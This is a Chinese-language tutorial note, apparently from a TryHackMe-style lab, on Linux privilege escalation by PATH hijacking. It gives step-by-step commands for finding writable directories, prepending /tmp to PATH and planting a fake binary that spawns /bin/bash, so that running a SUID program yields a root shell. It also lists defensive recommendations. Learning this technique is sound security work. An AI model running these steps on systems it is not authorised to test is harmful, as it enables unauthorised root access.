# 🛠 Linux 權限提升技巧：PATH 劫持攻擊（PATH Hijacking）

## 📘 基本概念

- **PATH** 是 Linux 的環境變數，定義系統搜尋可執行檔的資料夾路徑順序。
- 當執行命令且未使用絕對路徑時，系統會依照 PATH 變數的資料夾順序尋找對應可執行檔。
- 若 PATH 中包含使用者可寫入的資料夾，攻擊者可放置惡意可執行檔。
- 當含有 SUID 權限的程式執行並呼叫該程式名稱時，會執行惡意檔案，導致提權。
- **攻擊重點在於：**
  - 利用 SUID 程式中未使用絕對路徑呼叫指令（如 `system("cp file1 file2")`）。
  - 將惡意的同名程式（如 `cp`、`ls`）放在攻擊者可控制的目錄中。
  - 修改 `PATH` 變數，讓系統優先從含惡意檔案的目錄尋找指令。
  - 執行 SUID 程式時，會以 root 權限執行惡意指令，達成權限提升。


---

## 🎯 攻擊條件

1. 存在 SUID 程式，呼叫外部程式時未使用絕對路徑。
2. PATH 中有使用者可寫入的資料夾，且位置優先於系統目錄。
3. 攻擊者能在可寫資料夾建立同名惡意檔案。

---

## 攻擊步驟

### 1. 檢查關鍵檔案
- 查看 PATH 內容
  ```bash
  echo $PATH
  ```

- 找出系統中可寫資料夾（排除 /proc）
  ```bash
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  ```

### 2. 新增 path
- 若 /tmp 不在 PATH 中，加入 /tmp
  ```bash
  export PATH=/tmp:$PATH
  ```


### 3. 在 /tmp 建立惡意執行檔（命名為目標程式呼叫的名稱）
  ```bash
  echo '/bin/bash' > /tmp/thm
  chmod 777 /tmp/thm
  ```


### 4. 執行 SUID 程式（例如 ./path）
./path



## 🛡 防禦建議
- SUID 程式呼叫外部程式時使用絕對路徑。
- PATH 不應包含非系統資料夾或使用者可寫入路徑。
- 定期掃描 SUID 程式，審核可疑行為。
- 限制使用者寫入系統環境變數及重要目錄權限。

## 📌 小結
- PATH 劫持透過修改 PATH 中可寫入資料夾放置惡意執行檔，配合 SUID 程式可達成提權。
- 常見於 SUID 程式未使用絕對路徑呼叫外部程式。
- 防範以嚴格控制 PATH 與程式呼叫方式為主。